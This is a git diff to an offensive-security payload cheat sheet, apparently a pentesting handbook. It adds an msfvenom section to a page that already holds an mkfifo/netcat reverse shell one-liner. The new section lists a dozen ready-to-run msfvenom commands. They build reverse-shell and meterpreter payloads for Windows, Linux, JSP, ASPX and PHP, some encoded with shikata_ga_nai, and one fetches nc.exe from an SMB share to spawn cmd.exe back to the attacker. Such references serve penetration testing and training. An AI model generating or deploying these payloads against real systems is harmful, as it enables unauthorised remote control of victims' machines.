@@ -17,6 +17,7 @@
 - [LNK Files](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#LNK-Files)
 - [Markdown Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Markdown-Reverse-Shell)
 - [mkfifo Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#mkfifo-Reverse-Shell)
+- [msfvenom](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#msfvenom)
 - [Netcat Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Netcat-Reverse-Shell)
 - [nishang](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#nishang)
 - [PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PDF)
@@ -273,6 +274,24 @@ $shortcut.Save()
 
 ```c
 $ mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
+```
+
+## msfvenom
+
+```c
+$ msfvenom -l payloads   // list payloads
+$ msfvenom --list formats    // list formats for payloads
+$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o "r'<FILE>.exe"
+$ msfvenom -p windows/x64/exec CMD='\\<LHOST>\PATH\TO\SHARE\nc.exe <LHOST> <LPORT> -e cmd.exe' -f dll > <FILE>.dll
+$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>.elf
+$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/<FILE>.exe
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f WAR > <FILE>.war
+$ msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=<LHOST> LPORT=<LPORT>
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e php/base64 -f raw
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -b '\x00' -f exe    # -b is bad bytes
+$ msfvenom -p windows/meterpreter/reverse_http LHOST=<LHOST> LPORT=<LPORT> HttpUserAgent=<HEADER> -f exe -o <FILE>.exe
 ```
 
 ## Netcat Reverse Shell
